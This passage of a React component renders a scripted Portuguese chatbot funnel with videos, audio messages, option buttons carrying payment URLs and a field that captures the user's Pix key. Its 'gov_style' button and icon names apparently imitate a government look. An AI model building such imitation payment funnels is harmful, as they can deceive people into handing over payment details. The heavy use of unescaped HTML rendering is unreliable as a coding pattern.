    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    setIsBotTyping(true);

    if (stepConfig?.type === 'displayVideo' && stepConfig.nextStep) {
      handleUserActionAndNavigate(stepConfig.nextStep);
    }
  };


  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentTextInputConfig || !textInputValue.trim()) {
        const tempMsgId = `err-input-${Date.now()}`;
        setMessages(prev => [...prev, {id: tempMsgId, sender: 'bot', text: "Por favor, preencha o campo."}]);
        setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000);
        return;
    }

    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);

    setCurrentVideoData(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    setIsTextInputActive(false);
    setCurrentTextInputConfig(null);
    setIsBotTyping(true);

    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }
    setTextInputValue("");

    const nextStepKey = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep)?.nextStep;
    handleUserActionAndNavigate(nextStepKey);
  };

  const handleAudioMessagePlayPause = (msgId: string, audioUrl?: string) => {
    if (!audioUrl || !audioPlayerRef.current) return;

    if (currentPlayingAudioId === msgId && isAudioPlaying) {
      audioPlayerRef.current.pause();
      setIsAudioPlaying(false);
      // Don't nullify currentPlayingAudioId here, keep it to show the 'Play' icon correctly
    } else {
      if (audioPlayerRef.current.src !== audioUrl) {
        audioPlayerRef.current.src = audioUrl;
      }
      if (currentPlayingAudioId && currentPlayingAudioId !== msgId && isAudioPlaying) {
         audioPlayerRef.current.pause(); // Pause any other audio first
      }
      setCurrentPlayingAudioId(msgId);
      audioPlayerRef.current.play().then(() => {
        setIsAudioPlaying(true);
      }).catch(e => {
        console.error("Error playing audio:", e);
        setIsAudioPlaying(false);
        setCurrentPlayingAudioId(null); // Reset if play fails
      });
    }
  };


  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar_gov_style')) {
      return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0, filter: 'grayscale(1) brightness(0.8)'}}>💰</span>;
    }
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioPlayerRef} style={{ display: 'none' }} />

      {currentVideoData && !isBotTyping && (
        <div className="video-player-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoData.introductoryMessage && (
             <div className="message-container bot-message-container" style={{marginBottom: '10px', alignSelf: 'flex-start'}}>
                <div className="message bot-message">
                  {currentVideoData.introductoryMessage}
                </div>
            </div>
          )}
          <div
            className="video-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '9/16',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#000'
            }}
          >
            <video
              ref={videoPlayerRef}
              src={currentVideoData.videoUrl}
              muted={isVideoMuted}
              playsInline
              onEnded={handleVideoEnded}
              style={{ width: '100%', height: '100%', display: 'block', borderRadius: '8px', objectFit: 'cover' }}
            />
            {showVideoSoundOverlay && (
              <div
                onClick={handleVideoThumbnailClick}
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10, cursor: 'pointer'
                }}
              >
                {isVideoMuted ? <VolumeX size={48} /> : <Volume2 size={48} />}
                <span style={{ marginTop: '10px', fontSize: '16px', textAlign: 'center' }}>
                  {formatText(currentVideoData.thumbnailText)}
                </span>
              </div>
            )}
          </div>
        </div>
      )}

      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {!msg.audioUrl && msg.text && !msg.isDisplayMessage && !msg.isDisplayImage && (
                <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />
              )}

              {msg.isDisplayMessage && !msg.audioUrl && (
                <div className="display-message-content-block">
                  {msg.displayTitle && (
                    <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                      {getIconComponent(msg.displayIcon)}
                      <span dangerouslySetInnerHTML={{ __html: msg.displayTitle }} />
                    </h3>
                  )}
                  {msg.text && <p style={{ marginBottom: msg.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: msg.text}} />}
                  {msg.displayDetails && (
                    <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                      {Object.entries(msg.displayDetails).map(([key, value]) => (
                        <React.Fragment key={key}>
                          <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                          <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                        </React.Fragment>
                      ))}
                    </div>
                  )}
                  {msg.displayNote && (
                    <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                        <strong>Nota:</strong> <span dangerouslySetInnerHTML={{__html: msg.displayNote}}/>
                    </p>
                  )}
                </div>
              )}

              {msg.audioUrl && msg.sender === 'bot' && (
                 <div className="audio-message-player">
                    <button onClick={() => handleAudioMessagePlayPause(msg.id, msg.audioUrl)} className="play-pause-button">
                        {(currentPlayingAudioId === msg.id && isAudioPlaying) ? <Pause size={20} /> : <Play size={20} />}
                    </button>
                    <div className="audio-message-info">
                        {msg.displayTitle && !msg.text && <span className="audio-title" dangerouslySetInnerHTML={{ __html: msg.displayTitle }} />}
                        {msg.text && <span className="audio-text" style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
                        {!msg.text && !msg.displayTitle && <span className="audio-label">Mensagem de Áudio</span>}
                        <div className="audio-progress-bar-visual">
                            <div className="audio-progress-indicator-visual" style={{ width: (currentPlayingAudioId === msg.id && isAudioPlaying) ? '50%' : '0%' }}></div>
                        </div>
                    </div>
                 </div>
              )}
             {msg.audioUrl && msg.sender === 'bot' && msg.displayDetails && (
                 <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px', marginTop: '8px' }}>
                 {Object.entries(msg.displayDetails).map(([key, value]) => (
                     <React.Fragment key={key}>
                     <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                     <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                     </React.Fragment>
                 ))}
                 </div>
             )}
             {/* Display title for audio message if no other text is present and it has details */}
              {msg.audioUrl && msg.sender === 'bot' && msg.displayTitle && msg.text && msg.displayDetails && (
                <h3 style={{ fontWeight: 'bold', marginTop: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                    {getIconComponent(msg.displayIcon)}
                    <span dangerouslySetInnerHTML={{ __html: msg.displayTitle }} />
                </h3>
              )}


              {msg.isDisplayImage && (
                <div className="display-image-content-block" style={{ padding: '5px' }}>
                  {msg.imageMessage && <p style={{ marginBottom: '8px', padding: '5px 10px', whiteSpace: 'pre-line'}}>{msg.imageMessage}</p>}
                  {msg.imageUrl && (
                    <Image
                      src={msg.imageUrl}
                      alt={msg.imageAlt || "Imagem do Chat"}
                      width={300}
                      height={200}
                      data-ai-hint={msg.imageAiHint || "illustration"}
                      style={{ borderRadius: '8px', maxWidth: '100%', height: 'auto', display: 'block' }}
                      unoptimized
                    />
                  )}
                </div>
              )}

              {msg.sender === 'bot' && msg.options && msg.options.length > 0 && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text + (opt.nextStep || '') + (opt.action || '') + (opt.paymentUrl || '')}
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`}
                       dangerouslySetInnerHTML={{__html: opt.text}}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {isLoadingStep && !isBotTyping && (
        <div className="message-container bot-message-container loading-step-as-message">
          <div className="message bot-message" style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <Loader2 className="animate-spin" size={24} style={{ color: '#1451b4', flexShrink: 0 }} />
            <p style={{ fontSize: '15px', color: '#333', whiteSpace: 'pre-line', margin: 0 }}>
              {loadingMessage}
            </p>
          </div>
        </div>
      )}


      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input"
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {isBotTyping && (
         <div className="message-container bot-message-container">
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .simulated-chat-container::-webkit-scrollbar { display: none; }
        .simulated-chat-container { -ms-overflow-style: none; scrollbar-width: none; }

        .message-container {
          display: flex;
          margin-bottom: 12px;
          max-width: 90%;
        }
        .bot-message-container {
          align-self: flex-start;
        }
        .user-message-container {
          align-self: flex-end;
          flex-direction: row-reverse;
        }

        .message {
          padding: 10px 15px;
          border-radius: 18px;
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word;
          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
          width: auto;
          max-width: 100%;
        }
        .bot-message {
          background-color: #e9ecef;
          color: #333;
          border-bottom-left-radius: 4px;
        }
        .user-message {
          background-color: #007bff;
          color: white;
          border-bottom-right-radius: 4px;
          margin-left: auto;
        }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-wrap: wrap;
          align-items: flex-start;
          justify-content: flex-start;
          gap: 8px;
        }
        .chat-option-button {
          background-color: #007bff;
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 25px;
          cursor: pointer;
          font-size: 15px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .chat-option-button:hover {
          background-color: #0056b3;
        }
        .chat-option-button.primary_cta_button_gov_style {
          background-color: #16a34a;
          border-color: #16a34a;
          color: white;
          font-weight: bold;
        }
        .chat-option-button.primary_cta_button_gov_style:hover {
          background-color: #15803d;
          border-color: #15803d;
        }
        .chat-option-button.secondary_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #007bff;
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.secondary_link_button_gov_style:hover {
          color: #0056b3;
          background-color: transparent;
        }
         .chat-option-button.destructive_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #dc3545;
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.destructive_link_button_gov_style:hover {
          color: #c82333;
          background-color: transparent;
        }


        .typing-indicator {
          display: inline-flex;
          align-items: center;
          padding: 10px 15px;
        }
        .typing-indicator .dot {
          width: 8px;
          height: 8px;
          margin: 0 2px;
          background-color: #aaa;
          border-radius: 50%;
          animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes bounce {
          0%, 80%, 100% { transform: scale(0); }
          40% { transform: scale(1); }
        }
        .display-message-content-block .bot-message,
        .display-image-content-block .bot-message {
            width: auto;
            max-width: 100%;
        }
        .audio-message-player {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px;
            min-width: 200px;
        }
        .play-pause-button {
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background-color 0.2s;
            flex-shrink: 0;
        }
        .play-pause-button:hover {
            background-color: #0056b3;
        }
        .audio-message-info {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            overflow: hidden; /* Prevents text overflow issues */
        }
        .audio-label {
            font-size: 14px;
            color: #555;
            margin-bottom: 4px;
        }
        .audio-title {
            font-weight: bold;
            font-size: 15px;
            color: #333;
            margin-bottom: 2px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .audio-text {
            font-size: 14px;
            color: #444;
            margin-bottom: 4px;
            white-space: pre-line; /* Ensure this is still respected */
        }

        .audio-progress-bar-visual {
            background-color: #ccc;
            border-radius: 4px;
            height: 6px;
            width: 100%;
            overflow: hidden;
        }
        .audio-progress-indicator-visual {
            background-color: #007bff;
            height: 100%;
            border-radius: 4px;
            transition: width 0.1s linear;
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;

